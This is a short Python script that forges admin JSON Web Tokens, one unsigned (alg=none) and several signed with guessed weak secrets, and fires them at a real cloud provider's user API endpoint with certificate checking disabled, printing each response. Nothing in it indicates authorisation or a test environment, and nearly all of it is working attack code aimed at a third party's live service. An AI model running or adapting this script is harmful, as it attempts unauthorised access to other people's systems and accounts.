import urllib.request as u, urllib.error, ssl, time, base64, json
c=ssl._create_unverified_context()
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
def g(url,hdr):
    try:
        r=u.urlopen(u.Request(url,headers=hdr),context=c,timeout=7); return r.status, r.read(400).decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read(300).decode('utf-8','replace')
    except Exception as e: return -1, str(e)[:80]
# forged tokens the app platform might accept (alg=none, HS256 with common secrets, RS256 unsigned)
now=int(time.time())
tests={
 'alg_none': b64(b'{"alg":"none","typ":"JWT"}')+'.'+b64(json.dumps({"sub":"admin","exp":now+3600}).encode())+'.',
 'hs256_secret': None,  # fill below
}
import hmac,hashlib
def hs(tok_secret,payload):
    h=b64(b'{"alg":"HS256","typ":"JWT"}'); p=b64(json.dumps(payload).encode())
    sig=b64(hmac.new(tok_secret.encode(),(h+'.'+p).encode(),hashlib.sha256).digest()); return h+'.'+p+'.'+sig
for secret in ['secret','aiven','jwt','changeme','']:
    tests['hs256_'+secret or 'empty']=hs(secret,{"sub":"admin","exp":now+3600})
for name,tok in tests.items():
    if tok:
        print(name, g('https://userapi.amer-1.aivencloud.net/services', {'Authorization':'Bearer '+tok}))
